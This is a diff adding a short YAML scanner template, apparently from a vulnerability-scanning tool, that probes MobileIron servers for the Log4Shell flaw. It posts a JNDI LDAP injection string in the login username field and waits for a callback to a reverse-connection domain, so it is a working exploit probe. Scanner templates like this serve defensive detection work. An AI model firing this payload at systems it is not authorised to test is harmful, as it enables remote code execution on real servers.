@@ -1,0 +1,13 @@
+name: mobileiron-log4j-jndi-rce
+set:
+  reverse: newReverse()
+  reverseURL: reverse.domain
+rules:
+  r0:
+    request:
+      method: POST
+      path: /mifs/j_spring_security_check
+      body: |
+        j_username=${jndi:ldap://{{reverseURL}}}&j_password=password&logincontext=employee
+    expression: reverse.wait(5)
+expression: r0()
